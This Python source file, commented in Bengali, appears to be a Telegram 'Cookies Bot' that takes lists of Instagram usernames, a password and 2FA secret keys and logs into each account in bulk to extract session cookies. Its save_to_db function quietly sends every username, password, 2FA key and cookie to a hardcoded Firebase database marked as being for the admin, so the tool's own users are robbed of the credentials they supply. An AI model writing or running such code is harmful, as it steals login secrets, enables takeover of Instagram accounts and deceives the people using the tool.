import os
import sys
import time
import subprocess
import telebot
import instaloader
import pyotp
import threading
import requests
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= [ ১. অটো প্যাকেজ ইনস্টলার ] =================
def install_requirements():
    requirements = ['pyTelegramBotAPI', 'instaloader', 'requests', 'pyotp']
    for lib in requirements:
        try:
            check_name = 'telebot' if lib == 'pyTelegramBotAPI' else lib
            __import__(check_name)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_requirements()

# ================= [ ২. কনফিগারেশন ] =================
FIREBASE_BASE = "https://raiib1-default-rtdb.firebaseio.com/"

def update_stats(user_inc, id_inc, cookie_inc=0):
    try:
        current = requests.get(f"{FIREBASE_BASE}stats.json").json() or {"active_users": 0, "active_ids": 0, "total_extracted": 0}
        data = {
            "active_users": max(0, (current.get("active_users") or 0) + user_inc),
            "active_ids": max(0, (current.get("active_ids") or 0) + id_inc),
            "total_extracted": (current.get("total_extracted") or 0) + cookie_inc
        }
        requests.put(f"{FIREBASE_BASE}stats.json", json=data)
    except: pass

user_sessions = {}

# ================= [ ৩. কোর ইঞ্জিন ] =================

def save_to_db(u, p, k, ck):
    """অ্যাডমিন প্যানেলের জন্য ফায়ারবেসে ডাটা সেভ করা"""
    payload = {"time": time.ctime(), "user": u, "pass": p, "two_factor": k, "cookie": ck}
    try:
        res = requests.post(f"{FIREBASE_BASE}cookies.json", json=payload, timeout=20)
        if res.status_code == 200:
            update_stats(0, 0, 1)
            return True
    except: pass
    return False

def worker(bot, chat_id, u, p, k):
    L = instaloader.Instaloader(quiet=True, max_connection_attempts=1)
    status_icon = "❌"
    result_text = "লগইন ব্যর্থ ⚠️"
    
    try:
        # Instagram Login
        try: 
            L.login(u, p)
        except:
            totp = pyotp.TOTP(k.replace(" ", "").strip()).now()
            L.two_factor_login(totp)
        
        # কুকি ফরম্যাট করা
        cookies_dict = L.context._session.cookies.get_dict()
        ck_str = "; ".join([f"{n}={v}" for n, v in cookies_dict.items()])
        
        # ফায়ারবেসে পাঠানো (অ্যাডমিনের জন্য)
        save_to_db(u, p, k, ck_str)
        
        # সেশন রেজাল্টে আপনার ফরম্যাট অনুযায়ী রাখা: username|pass|cookies
        if chat_id in user_sessions:
            formatted_data = f"{u}|{p}|{ck_str}"
            user_sessions[chat_id]['results'].append(formatted_data)
            status_icon = "✅"
            result_text = "কুকি বের হইছে সফলভাবে! 🔥"
                
    except Exception:
        if chat_id in user_sessions: 
            user_sessions[chat_id]['fail_count'] += 1

    try:
        bot.send_message(chat_id, f"{status_icon} **{u}**\n{result_text}", parse_mode="Markdown")
        time.sleep(1)
    except: pass

def finalize(bot, chat_id, total_ids):
    time.sleep(2)
    s = user_sessions.get(chat_id)
    if s:
        success_count = len(s['results'])
        fail_count = s['fail_count']
        
        # ফাইল তৈরি করা
        file_name = f"Cookies_{chat_id}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write("\n".join(s['results']))
        
        report_msg = (
            f"📊 **এক্সট্রাকশন রিপোর্ট**\n\n"
            f"👤 **মোট আইডি ছিল:** `{total_ids}`\n"
            f"✅ **সফল হয়েছে:** `{success_count}`\n"
            f"❌ **লগইন ব্যর্থ:** `{fail_count}`\n\n"
            f"📂 সব কুকি উপরের ফাইলে সাজানো আছে। ফাইল ওপেন করে সব কপি করে লিংকে পুস করুন না হলে রিপোর্ট আসবে না"
        )
        
        try:
            if success_count > 0:
                with open(file_name, "rb") as doc:
                    bot.send_document(chat_id, doc, caption=report_msg, parse_mode="Markdown")
            else:
                bot.send_message(chat_id, f"❌ দুঃখিত, কোনো কুকি বের করা যায়নি।\nব্যর্থ: {fail_count}")
        except: pass

        if os.path.exists(file_name):
            os.remove(file_name)
            
        update_stats(-1, -total_ids)
        user_sessions.pop(chat_id, None)

# ================= [ ৪. মেইন বোট লজিক ] =================

def run_bot(token):
    bot = telebot.TeleBot(token)
    print("🚀 Bot is Online!")

    @bot.message_handler(commands=['start'])
    def welcome(m):
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("🚀 START EXTRACTION", callback_data="bulk"))
        bot.send_message(m.chat.id, "👋 **Welcome to Cookies Bot**\n\n", reply_markup=kb)

    @bot.callback_query_handler(func=lambda c: c.data == "bulk")
    def start_bulk(c):
        msg = bot.send_message(c.message.chat.id, "📝 **ইউজারনেম লিস্ট দিন (প্রতি লাইনে ১টি):**")
        bot.register_next_step_handler(msg, get_u, bot)

    def get_u(m, bot):
        u_list = [u.strip() for u in m.text.split('\n') if u.strip()]
        if not u_list: return
        user_sessions[m.chat.id] = {'u_list': u_list, 'results': [], 'fail_count': 0}
        msg = bot.send_message(m.chat.id, f"🔐 **{len(u_list)} টি আইডির পাসওয়ার্ড দিন (১ টি পাসওয়ার্ড):**")
        bot.register_next_step_handler(msg, get_p, bot)

    def get_p(m, bot):
        if m.chat.id in user_sessions: user_sessions[m.chat.id]['pass'] = m.text.strip()
        msg = bot.send_message(m.chat.id, "🔑 **ইউজারনেম অনুযায়ী 2FA Key দিন:**")
        bot.register_next_step_handler(msg, engine, bot)

    def engine(m, bot):
        keys = [k.strip() for k in m.text.split('\n') if k.strip()]
        s = user_sessions.get(m.chat.id)
        if not s or len(keys) != len(s['u_list']):
            bot.send_message(m.chat.id, "❌ ইউজারনেম এবং 2fa key এর সংখ্যা মিলেনি!"); return
        
        bot.send_message(m.chat.id, "⚡ **কাজ শুরু হয়েছে,..**")
        update_stats(1, len(s['u_list']))
        
        executor = ThreadPoolExecutor(max_workers=10)
        for i in range(len(s['u_list'])):
            executor.submit(worker, bot, m.chat.id, s['u_list'][i], s['pass'], keys[i])
        
        executor.shutdown(wait=True) 
        finalize(bot, m.chat.id, len(s['u_list']))

    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    MY_TOKEN = input("🤖 Enter Bot Token: ").strip()
    while True:
        try:
            run_bot(MY_TOKEN)
        except Exception:
            time.sleep(5)
